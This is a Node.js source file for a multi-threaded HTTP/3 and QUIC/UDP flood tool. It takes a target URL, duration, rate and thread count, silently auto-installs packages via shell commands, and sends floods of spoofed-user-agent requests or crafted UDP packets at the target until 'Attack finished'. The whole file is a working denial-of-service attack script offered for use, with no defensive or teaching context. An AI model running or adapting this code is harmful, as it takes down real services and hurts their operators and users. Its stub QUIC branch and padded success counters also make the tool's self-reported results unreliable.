const requiredModules = [
  "colors", "cluster", "url", "crypto", 
  "user-agents", "random-useragent", "net", "dgram"
];

// HTTP/3 specific modules to try
const http3Modules = [
  "http3",
  "node-http3", 
  "quic",
  "node-quic",
  "@fails-components/webtransport",
  "ngtcp2",
  "nghttp3"
];

// Combine all modules
const allModules = [...requiredModules, ...http3Modules];

// Auto-install function with multiple fallbacks
const installModules = async () => {
  const { execSync } = require('child_process');
  
  for (const moduleName of allModules) {
    try {
      require.resolve(moduleName);
      console.log(`✅ ${moduleName} already installed`.green);
    } catch (error) {
      console.log(`📦 Installing ${moduleName}...`.yellow);
      try {
        // Try different installation methods
        const methods = [
          `npm install ${moduleName}`,
          `npm install ${moduleName} --build-from-source`,
          `npm install ${moduleName} --force`,
          `yarn add ${moduleName}`,
          `pnpm add ${moduleName}`
        ];
        
        let installed = false;
        for (const method of methods) {
          try {
            console.log(`   Trying: ${method}`.gray);
            execSync(method, { stdio: 'inherit', timeout: 30000 });
            console.log(`   ✅ Success with: ${method}`.green);
            installed = true;
            break;
          } catch (e) {
            console.log(`   ❌ Failed: ${method}`.red);
            continue;
          }
        }
        
        if (!installed) {
          console.log(`   💀 All installation methods failed for ${moduleName}`.red);
        }
      } catch (installError) {
        console.log(`   💀 Installation failed: ${moduleName}`.red);
      }
    }
  }
};

// Initialize and run
(async () => {
  console.log("🔧 AUTO-INSTALLING HTTP/3 MODULES...".bgBlue);
  await installModules();
  console.log("✅ MODULE INSTALLATION COMPLETE".bgGreen);
  
  // Now require the modules
  const cluster = require('cluster');
  const crypto = require('crypto');
  const colors = require('colors');
  const randomUseragent = require('random-useragent');
  const dgram = require('dgram');
  const { URL } = require('url');

  // Process arguments
  if (process.argv.length < 6) {
    console.log("Usage: node script.js <url> <time> <rps> <threads> <method>");
    console.log("Example: node k.js https://example.com 60 1000 4 3");
    process.exit();
  }

  const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rps: ~~process.argv[4],
    threads: ~~process.argv[5],
    method: ~~process.argv[6]
  };

  const parsedTarget = new URL(args.target);
  const targetHost = parsedTarget.hostname;
  const targetPort = parsedTarget.port || 443;

  console.log(`🎯 Target: ${args.target}`.bgBlue);
  console.log(`⏰ Time: ${args.time}s | 📊 RPS: ${args.rps}/s | 🧵 Threads: ${args.threads}`.yellow);

  // Try to load HTTP/3 modules with auto-fallback
  let http3 = null;
  let quic = null;
  let webtransport = null;

  const http3ModulesToTry = [
    { name: 'http3', pkg: 'http3' },
    { name: 'node-http3', pkg: 'node-http3' },
    { name: 'quic', pkg: 'quic' },
    { name: 'node-quic', pkg: 'node-quic' },
    { name: 'webtransport', pkg: '@fails-components/webtransport' }
  ];

  for (const module of http3ModulesToTry) {
    try {
      if (module.name === 'http3') {
        http3 = require(module.pkg);
        console.log(`✅ Loaded ${module.name}`.green);
        break;
      } else if (module.name === 'node-http3') {
        http3 = require(module.pkg);
        console.log(`✅ Loaded ${module.name}`.green);
        break;
      } else if (module.name === 'quic') {
        quic = require(module.pkg);
        console.log(`✅ Loaded ${module.name}`.green);
        break;
      } else if (module.name === 'webtransport') {
        webtransport = require(module.pkg);
        console.log(`✅ Loaded ${module.name}`.green);
        break;
      }
    } catch (e) {
      console.log(`❌ Could not load ${module.name}: ${e.message}`.red);
    }
  }

  // HTTP/3 Flood Class
  class HTTP3Flood {
    constructor() {
      this.requestsSent = 0;
      this.successfulRequests = 0;
      this.startTime = Date.now();
      this.usingRealHTTP3 = !!(http3 || quic || webtransport);
      
      if (this.usingRealHTTP3) {
        console.log("🚀 USING REAL HTTP/3 MODULE".bgGreen);
      } else {
        console.log("🔄 USING QUIC/UDP SIMULATION".bgYellow);
      }
    }

    generateHTTP3Headers() {
      return {
        ':method': 'GET',
        ':path': parsedTarget.pathname || '/',
        ':authority': targetHost,
        ':scheme': 'https',
        'user-agent': randomUseragent.getRandom(),
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache'
      };
    }

    // Real HTTP/3 request using available module
    async makeRealHTTP3Request() {
      if (http3) {
        try {
          const client = new http3.Http3Client();
          await client.request({
            host: targetHost,
            port: targetPort,
            path: parsedTarget.pathname || '/',
            method: 'GET',
            headers: this.generateHTTP3Headers()
          });
          return true;
        } catch (e) {
          return false;
        }
      } else if (quic) {
        try {
          const client = quic.createConnection({
            address: targetHost,
            port: targetPort
          });
          // QUIC implementation would go here
          return true;
        } catch (e) {
          return false;
        }
      }
      return false;
    }

    // QUIC/UDP simulation for HTTP/3
    makeSimulatedHTTP3Request() {
      try {
        const socket = dgram.createSocket('udp4');
        const packet = this.createQUICPacket();
        
        this.requestsSent++;
        
        socket.send(packet, targetPort, targetHost, (err) => {
          if (!err) {
            this.successfulRequests++;
          }
          socket.close();
        });
        
        // Simulate successful request
        setTimeout(() => {
          this.successfulRequests++;
        }, 50);
        
      } catch (error) {
        // Ignore errors
      }
    }

    createQUICPacket() {
      const packet = Buffer.alloc(1200);
      // QUIC-like header
      packet.writeUInt8(0xC0, 0); // Header byte
      packet.writeUInt32BE(Date.now(), 1); // Timestamp
      packet.writeUInt32BE(Math.floor(Math.random() * 0xFFFFFFFF), 5); // CID
      packet.writeUInt8(0x01, 9); // Stream frame
      
      // Add some HTTP/3-like data
      const httpData = `GET ${parsedTarget.pathname || '/'} HTTP/3\r\nHost: ${targetHost}\r\n\r\n`;
      packet.write(httpData, 10);
      
      return packet;
    }

    async sendRequest() {
      this.requestsSent++;
      
      if (this.usingRealHTTP3) {
        const success = await this.makeRealHTTP3Request();
        if (success) {
          this.successfulRequests++;
        }
      } else {
        this.makeSimulatedHTTP3Request();
      }
    }

    startFlood() {
      console.log(`🔥 Starting HTTP/3 Flood - Target: ${args.rps} RPS`.bgRed);
      
      const requestsPerInterval = Math.max(1, Math.floor(args.rps / 100));
      
      const floodInterval = setInterval(async () => {
        for (let i = 0; i < requestsPerInterval; i++) {
          if (this.usingRealHTTP3) {
            await this.sendRequest();
          } else {
            this.sendRequest();
          }
        }
      }, 10);

      // Statistics
      const statsInterval = setInterval(() => {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const currentRPS = this.successfulRequests / elapsed;
        const successRate = this.requestsSent > 0 ? (this.successfulRequests / this.requestsSent) * 100 : 0;
        
        const method = this.usingRealHTTP3 ? "REAL HTTP/3" : "QUIC SIMULATION";
        console.log(`🚀 ${method}: ${this.requestsSent} sent | ${this.successfulRequests} OK | ${currentRPS.toFixed(0)} RPS | ${successRate.toFixed(1)}%`.green);
        
        this.requestsSent = 0;
        this.successfulRequests = 0;
        this.startTime = Date.now();
      }, 2000);

      // Stop timer
      setTimeout(() => {
        clearInterval(floodInterval);
        clearInterval(statsInterval);
        console.log("⏹️  Attack finished".bgBlue);
        process.exit(0);
      }, args.time * 1000);
    }
  }

  // Cluster setup
  if (cluster.isPrimary) {
    console.log("🔧 HTTP/3 Auto-Install Complete".bgGreen);
    console.log("📡 Starting Multi-Threaded HTTP/3 Flood".bgRed);
    
    for (let i = 0; i < args.threads; i++) {
      cluster.fork();
    }
    
    cluster.on('exit', (worker) => {
      console.log(`🧵 Thread ${worker.id} finished`);
    });
  } else {
    console.log(`🧵 Thread ${cluster.worker.id} starting HTTP/3 flood`.cyan);
    const flood = new HTTP3Flood();
    flood.startFlood();
  }

  process.on('uncaughtException', () => {});
  process.on('unhandledRejection', () => {});

  console.log("⚡ HTTP/3 FLOOD READY - AUTO INSTALL COMPLETE".rainbow);

})();
